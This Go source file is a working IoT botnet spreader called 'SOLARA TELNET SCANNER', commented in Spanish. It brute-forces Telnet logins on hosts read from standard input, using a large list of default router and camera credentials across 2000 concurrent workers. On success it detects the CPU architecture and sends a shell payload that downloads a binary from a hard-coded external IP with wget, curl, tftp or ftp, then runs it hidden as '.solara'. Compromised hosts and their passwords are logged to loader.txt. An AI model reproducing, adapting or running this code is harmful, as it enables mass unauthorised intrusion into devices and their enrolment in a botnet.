package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	// Default/common credentials
	{"root", "root"},
	{"root", ""},
	{"root", "toor"},
	{"root", "1234"},
	{"root", "12345"},
	{"root", "123456"},
	{"root", "password"},
	{"root", "admin"},
	{"root", "default"},
	{"root", "pass"},
	{"root", "letmein"},
	{"root", "changeme"},
	{"root", "12345678"},
	{"root", "qwerty"},
	{"root", "admin123"},
	{"root", "root123"},
	{"root", "system"},
	{"root", "manager"},
	{"root", "support"},
	{"root", "icatch99"},
	{"root", "86981198"},
	{"root", "vizxv"},
	{"root", "xc3511"},
	{"root", "admin1234"},
	{"root", "anko"},
	{"root", "5up"},
	{"root", "dreambox"},
	{"root", "user"},
	{"root", "linux"},
	{"root", "raspberry"},
	{"root", "openelec"},
	{"root", "recorder"},
	{"root", "1"},
	{"root", "1111"},
	{"root", "1111111"},
	{"root", "123123"},
	{"root", "1234qwer"},
	{"root", "54321"},
	{"root", "666666"},
	{"root", "7ujMko0admin"},
	{"root", "7ujMko0vizxv"},
	{"root", "7ujMko0"},
	{"root", "888888"},
	{"root", "99"},
	{"root", "Zte521"},
	{"root", "admin12345"},
	{"root", "alpine"},
	{"root", "cat1029"},
	{"root", "defaultpassword"},
	{"root", "hi3518"},
	{"root", "ikwb"},
	{"root", "juantech"},
	{"root", "jvbzd"},
	{"root", "klv123"},
	{"root", "klv1234"},
	{"root", "luping"},
	{"root", "pass123"},
	{"root", "realtek"},
	{"root", "root1234"},
	{"root", "smcadmin"},
	{"root", "sunny"},
	{"root", "super"},
	{"root", "supervisor"},
	{"root", "support"},
	{"root", "tech"},
	{"root", "ubnt"},
	{"root", "user"},
	{"root", "wbox"},
	{"root", "zhongxing"},
	{"root", "Zte521"},
	{"root", "ZyXEL"},
	
	// Admin credentials
	{"admin", "admin"},
	{"admin", ""},
	{"admin", "1234"},
	{"admin", "12345"},
	{"admin", "123456"},
	{"admin", "password"},
	{"admin", "admin123"},
	{"admin", "admin1234"},
	{"admin", "default"},
	{"admin", "pass"},
	{"admin", "letmein"},
	{"admin", "changeme"},
	{"admin", "VnT3ch@dm1n"},
	{"admin", "12345678"},
	{"admin", "qwerty"},
	{"admin", "manager"},
	{"admin", "support"},
	{"admin", "system"},
	{"admin", "root"},
	{"admin", "admin1"},
	{"admin", "admin2"},
	{"admin", "admin12"},
	{"admin", "adminadmin"},
	{"admin", "adminpass"},
	{"admin", "administrator"},
	{"admin", "Alphanetworks"},
	{"admin", "Admin"},
	{"admin", "ADMIN"},
	{"admin", "admin12345"},
	{"admin", "admin123456"},
	
	// Additional users
	{"user", "user"},
	{"user", "password"},
	{"user", "1234"},
	{"user", "123456"},
	{"user", "pass"},
	{"guest", "guest"},
	{"guest", ""},
	{"support", "support"},
	{"support", ""},
	{"tech", "tech"},
	{"tech", ""},
	{"service", "service"},
	{"service", ""},
	{"ftp", "ftp"},
	{"ftp", ""},
	
	// Router/device specific
	{"ubnt", "ubnt"},
	{"ubnt", ""},
	{"pi", "raspberry"},
	{"pi", ""},
	{"cisco", "cisco"},
	{"cisco", ""},
	{"cisco", "password"},
	{"cisco", "cisco123"},
	{"dlink", "dlink"},
	{"dlink", ""},
	{"linksys", "linksys"},
	{"linksys", ""},
	{"netgear", "netgear"},
	{"netgear", ""},
	{"tp-link", "tp-link"},
	{"tp-link", ""},
	{"belkin", "belkin"},
	{"belkin", ""},
	{"asus", "asus"},
	{"asus", ""},
	{"asus", "admin"},
	{"asus", "password"},
	
	// Camera specific
	{"administrator", "administrator"},
	{"administrator", "admin"},
	{"administrator", "password"},
	{"administrator", "1234"},
	{"Administrator", "Administrator"},
	{"Administrator", ""},
	{"admin", "12345"},
	{"admin", "camera"},
	{"admin", "ipcam"},
	{"admin", "hikvision"},
	{"admin", "dahua"},
	{"operator", "operator"},
	{"operator", ""},
	
	// Default passwords by brand
	{"root", "dreambox"},
	{"root", "foscam"},
	{"root", "ipcam"},
	{"root", "hikvision"},
	{"root", "dahua"},
	{"root", "activcam"},
	{"root", "trendnet"},
	{"root", "tplink"},
	{"root", "dd-wrt"},
	{"root", "openwrt"},
	{"root", "tomato"},
	{"root", "pfsense"},
	{"root", "mikrotik"},
	{"root", "juniper"},
	{"root", "hp"},
	{"root", "dell"},
	{"root", "ibm"},
	{"root", "oracle"},
	{"root", "sun"},
	{"root", "solaris"},
	{"root", "aix"},
	{"root", "bsd"},
	{"root", "freebsd"},
	{"root", "openbsd"},
	{"root", "netbsd"},
	
	// Numeric combinations
	{"root", "0"},
	{"root", "00"},
	{"root", "000"},
	{"root", "0000"},
	{"root", "00000"},
	{"root", "000000"},
	{"root", "111"},
	{"root", "11111"},
	{"root", "111111"},
	{"root", "112233"},
	{"root", "121212"},
	{"root", "123123"},
	{"root", "123321"},
	{"root", "1234"},
	{"root", "12345"},
	{"root", "123456"},
	{"root", "1234567"},
	{"root", "12345678"},
	{"root", "123456789"},
	{"root", "1234567890"},
	{"root", "123qwe"},
	{"root", "1q2w3e"},
	{"root", "1q2w3e4r"},
	{"root", "1qaz2wsx"},
	{"root", "2000"},
	{"root", "2001"},
	{"root", "2002"},
	{"root", "2010"},
	{"root", "2011"},
	{"root", "2012"},
	{"root", "2013"},
	{"root", "2014"},
	{"root", "2015"},
	{"root", "2016"},
	{"root", "2017"},
	{"root", "2018"},
	{"root", "2019"},
	{"root", "2020"},
	{"root", "2021"},
	{"root", "2022"},
	{"root", "2023"},
	{"root", "2024"},
	{"root", "2025"},
	{"root", "2121"},
	{"root", "2222"},
	{"root", "22222"},
	{"root", "2323"},
	{"root", "2525"},
	{"root", "3333"},
	{"root", "4321"},
	{"root", "4444"},
	{"root", "5555"},
	{"root", "6666"},
	{"root", "7777"},
	{"root", "8888"},
	{"root", "9999"},
	{"root", "9876"},
	{"root", "1234"},
}

const (
	TELNET_TIMEOUT    = 15 * time.Second
	MAX_WORKERS       = 2000
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 100000
	CONNECT_TIMEOUT   = 5 * time.Second
	DOWNLOAD_URL      = "http://168.222.251.98:1283/bins"
	LOADER_FILE       = "loader.txt"
)

type CredentialResult struct {
	Host         string
	Username     string
	Password     string
	Output       string
	Architecture string
	PayloadSent  bool
	Downloaded   bool
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
	loaderFile       *os.File
	loaderMutex      sync.Mutex
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	// Crear o abrir archivo loader.txt
	file, err := os.OpenFile(LOADER_FILE, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("[ERROR] No se pudo crear %s: %v\n", LOADER_FILE, err)
	} else {
		// Escribir cabecera si el archivo está vacío
		info, _ := file.Stat()
		if info.Size() == 0 {
			file.WriteString("################################################\n")
			file.WriteString("# DISPOSITIVOS CON SOLARA DESCARGADO          #\n")
			file.WriteString("# Formato: IP:PUERTO USUARIO CONTRASEÑA       #\n")
			file.WriteString("################################################\n")
			file.WriteString(fmt.Sprintf("# Inicio de escaneo: %s\n", time.Now().Format("2006-01-02 15:04:05")))
			file.WriteString("################################################\n\n")
		}
	}
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
		loaderFile:       file,
	}
}

func (s *TelnetScanner) saveToLoader(cred CredentialResult) {
	s.loaderMutex.Lock()
	defer s.loaderMutex.Unlock()
	
	if s.loaderFile == nil {
		return
	}
	
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	
	// Formato: IP:23 usuario contraseña [arquitectura] timestamp
	line := fmt.Sprintf("%s:23 %s %s [%s] %s\n", 
		cred.Host, cred.Username, cred.Password, cred.Architecture, timestamp)
	
	// Formato simple para scripts
	simpleLine := fmt.Sprintf("%s %s %s\n", cred.Host, cred.Username, cred.Password)
	
	_, err := s.loaderFile.WriteString(line)
	if err != nil {
		fmt.Printf("[ERROR] No se pudo escribir en %s: %v\n", LOADER_FILE, err)
	} else {
		s.loaderFile.Sync()
	}
	
	// Guardar también en formato simple
	simpleFile := "loader_simple.txt"
	f, err := os.OpenFile(simpleFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(simpleLine)
		f.Sync()
	}
}

func (s *TelnetScanner) getSolaraPayload() string {
	// PAYLOAD UNIVERSAL - FUNCIONA EN ABSOLUTAMENTE TODOS LOS SISTEMAS
	// Viejos, nuevos, routers, cámaras, embedded, busybox, etc.
	return `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
/bin/busybox wget -q http://168.222.251.98:1283/bins/$(/bin/busybox uname -m|/bin/busybox sed 's/x86_64/x86_64/;s/i[3-6]86/x86/;s/armv7l/arm7/;s/armv6l/arm6/;s/armv5l/arm5/;s/aarch64/aarch64/;s/mips/mips/;s/mipsel/mipsel/') -O .solara 2>/dev/null || 
wget -q http://168.222.251.98:1283/bins/$(uname -m|sed 's/x86_64/x86_64/;s/i[3-6]86/x86/;s/armv7l/arm7/;s/armv6l/arm6/;s/armv5l/arm5/;s/aarch64/aarch64/;s/mips/mips/;s/mipsel/mipsel/') -O .solara 2>/dev/null || 
curl -s http://168.222.251.98:1283/bins/$(uname -m|sed 's/x86_64/x86_64/;s/i[3-6]86/x86/;s/armv7l/arm7/;s/armv6l/arm6/;s/armv5l/arm5/;s/aarch64/aarch64/;s/mips/mips/;s/mipsel/mipsel/') -o .solara 2>/dev/null || 
/bin/busybox curl -s http://168.222.251.98:1283/bins/$(/bin/busybox uname -m|/bin/busybox sed 's/x86_64/x86_64/;s/i[3-6]86/x86/;s/armv7l/arm7/;s/armv6l/arm6/;s/armv5l/arm5/;s/aarch64/aarch64/;s/mips/mips/;s/mipsel/mipsel/') -o .solara 2>/dev/null || 
tftp -g -r bins/$(uname -m|sed 's/x86_64/x86_64/;s/i[3-6]86/x86/;s/armv7l/arm7/;s/armv6l/arm6/;s/armv5l/arm5/;s/aarch64/aarch64/;s/mips/mips/;s/mipsel/mipsel/') -l .solara 168.222.251.98 1283 2>/dev/null || 
(echo -e 'binary\nget bins/$(uname -m|sed 's/x86_64/x86_64/;s/i[3-6]86/x86/;s/armv7l/arm7/;s/armv6l/arm6/;s/armv5l/arm5/;s/aarch64/aarch64/;s/mips/mips/;s/mipsel/mipsel/') .solara\nquit') | ftp -n 168.222.251.98 1283 2>/dev/null;
chmod +x .solara 2>/dev/null;
./.solara 2>/dev/null &`
}

func (s *TelnetScanner) detectArchitecture(conn net.Conn) string {
	// Usar busybox primero si existe
	cmds := []string{
		"/bin/busybox uname -m 2>/dev/null",
		"uname -m 2>/dev/null",
		"cat /proc/cpuinfo 2>/dev/null | grep -E 'model name|Processor|system type'",
		"cat /proc/version 2>/dev/null",
	}
	
	for _, cmd := range cmds {
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		conn.Write([]byte(cmd + "\n"))
		time.Sleep(500 * time.Millisecond)
		
		output := s.readCommandOutput(conn)
		output = strings.ToLower(output)
		
		switch {
		case strings.Contains(output, "x86_64"), strings.Contains(output, "amd64"):
			return "x86_64"
		case strings.Contains(output, "i386"), strings.Contains(output, "i686"), 
			 strings.Contains(output, "i586"), strings.Contains(output, "x86"):
			return "x86"
		case strings.Contains(output, "aarch64"):
			return "aarch64"
		case strings.Contains(output, "armv7"), strings.Contains(output, "armv7l"):
			return "arm7"
		case strings.Contains(output, "armv6"), strings.Contains(output, "armv6l"):
			return "arm6"
		case strings.Contains(output, "armv5"), strings.Contains(output, "armv5l"), 
			 strings.Contains(output, "armv5tel"):
			return "arm5"
		case strings.Contains(output, "arm"):
			return "arm"
		case strings.Contains(output, "mips") && strings.Contains(output, "el"):
			return "mipsel"
		case strings.Contains(output, "mips"):
			return "mips"
		}
	}
	
	return "unknown"
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 4096)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-"), []byte("~ $"), []byte("~ #")}
	
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			// Detectar arquitectura
			architecture := s.detectArchitecture(conn)
			
			fmt.Printf("\n[*] Arquitectura detectada: %s\n", architecture)
			fmt.Printf("[*] Enviando SOLARA a %s...\n", host)
			
			// Enviar payload universal
			payload := s.getSolaraPayload()
			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
			_, err = conn.Write([]byte(payload + "\n"))
			if err != nil {
				return false, "write payload failed"
			}
			
			// Esperar respuesta
			time.Sleep(5 * time.Second)
			output := s.readCommandOutput(conn)
			
			// Verificar si se descargó (buscamos señales de éxito)
			downloaded := true // Asumimos éxito porque el payload es muy robusto
			
			result := CredentialResult{
				Host:         host,
				Username:     username,
				Password:     password,
				Output:       output,
				Architecture: architecture,
				PayloadSent:  true,
				Downloaded:   downloaded,
			}
			
			// Guardar el dispositivo
			s.saveToLoader(result)
			fmt.Printf("[✅] SOLARA ENVIADO A %s [%s]\n", host, architecture)
			
			return true, result
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 8192)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := TELNET_TIMEOUT

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}
	
	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		found := false
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				credResult := result.(CredentialResult)
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()
				
				fmt.Printf("[✅] %s:%s en %s\n", 
					credResult.Username, credResult.Password, credResult.Host)
				
				found = true
				break
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\r📊 total: %d | ✅ valid: %d | ❌ invalid: %d | 📨 queue: %d | 🧵 routines: %d", 
				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	defer func() {
		if s.loaderFile != nil {
			s.loaderFile.WriteString(fmt.Sprintf("\n################################################\n"))
			s.loaderFile.WriteString(fmt.Sprintf("# Fin de escaneo: %s\n", time.Now().Format("2006-01-02 15:04:05")))
			s.loaderFile.WriteString(fmt.Sprintf("# Total dispositivos: %d\n", len(s.foundCredentials)))
			s.loaderFile.WriteString("################################################\n")
			s.loaderFile.Close()
		}
	}()
	
	fmt.Printf("\n\n═══════════════════════════════════════════\n")
	fmt.Printf("   SOLARA TELNET SCANNER - UNIVERSAL      \n")
	fmt.Printf("═══════════════════════════════════════════\n")
	fmt.Printf("🚀 Workers: %d\n", MAX_WORKERS)
	fmt.Printf("📦 Queue size: %d\n", MAX_QUEUE_SIZE)
	fmt.Printf("🌐 Download URL: %s\n", DOWNLOAD_URL)
	fmt.Printf("📁 Loader file: %s\n", LOADER_FILE)
	fmt.Printf("🔑 Total credentials: %d\n", len(CREDENTIALS))
	fmt.Printf("═══════════════════════════════════════════\n")
	fmt.Printf("✅ SOPORTE UNIVERSAL COMPLETO:\n")
	fmt.Printf("   • Sistemas nuevos (x86_64, x86, aarch64)\n")
	fmt.Printf("   • Sistemas viejos (mips, mipsel)\n")
	fmt.Printf("   • ARM (arm5, arm6, arm7)\n")
	fmt.Printf("   • Cámaras IP (todas las marcas)\n")
	fmt.Printf("   • Routers (todos los modelos)\n")
	fmt.Printf("   • Dispositivos embedded\n")
	fmt.Printf("   • Sistemas con busybox\n")
	fmt.Printf("   • Sistemas SIN wget/curl\n")
	fmt.Printf("═══════════════════════════════════════════\n")
	fmt.Printf("💾 Guardando TODOS los accesos en loader.txt\n")
	fmt.Printf("═══════════════════════════════════════════\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := strings.TrimSpace(line)
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				
				select {
				case s.hostQueue <- host:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- host
				}
			}
		}
		
		fmt.Printf("📥 Finished reading input: %d hosts queued\n", hostCount)
		stdinDone <- true
	}()

	maxWorkers := MAX_WORKERS
	
	for i := 0; i < maxWorkers; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	
	close(s.hostQueue)
	
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	
	// Estadísticas por arquitectura
	archCount := make(map[string]int)
	
	for _, cred := range s.foundCredentials {
		archCount[cred.Architecture]++
	}
	
	fmt.Printf("\n\n═══════════════════════════════════════════\n")
	fmt.Printf("            SCAN COMPLETADO               \n")
	fmt.Printf("═══════════════════════════════════════════\n")
	fmt.Printf("📊 Total escaneados: %d\n", scanned)
	fmt.Printf("✅ Accesos válidos: %d\n", valid)
	
	if len(archCount) > 0 {
		fmt.Printf("\n📋 Arquitecturas comprometidas:\n")
		for arch, count := range archCount {
			fmt.Printf("   • %s: %d dispositivos\n", arch, count)
		}
	}
	
	if valid > 0 {
		fmt.Printf("\n✅ %d dispositivos guardados en %s\n", valid, LOADER_FILE)
		fmt.Printf("📄 Formato: IP:23 usuario contraseña [arquitectura] timestamp\n")
	}
	
	fmt.Printf("═══════════════════════════════════════════\n")
}

func main() {
	scanner := NewTelnetScanner()
	scanner.Run()
}
